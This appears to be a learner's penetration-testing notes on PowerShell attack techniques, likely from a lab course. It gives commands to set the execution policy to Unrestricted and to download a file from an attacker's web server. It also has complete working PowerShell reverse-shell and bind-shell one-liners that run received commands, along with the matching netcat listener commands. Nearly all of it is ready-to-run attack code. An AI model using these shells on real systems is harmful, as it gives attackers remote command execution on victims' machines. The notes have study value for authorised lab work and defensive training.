

* on each system powershell has a policy orders which func can be excutied on the system, by defualt the policy is set to 'restricted'
to change it we need to lunch powershell as admin on the windows machine and set the execution policy to 'unrestricted':
command: Set-ExecutionPolicy Unrestricted

* to verify execution policy:
command: Get-ExecutionPlicy

powershell file transfer:
------------------------

1.start a web server on kali
2. on windows machine:
   powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip_address/file_name.exe','C:\Users\OffSec\Desktop\file_name.exe')" 

powershell reverse shell one-liner:
----------------------------------

1. on kali attacker machine start a listener: nc -nvlp 443
2. on victim win machine run next one-liner script:
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


powershell bind shells:
-----------------------

1. create the bind shell (listener) on win machine:
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
2. connect with kali attacker machine:
nc -nv <ipaddress> 443
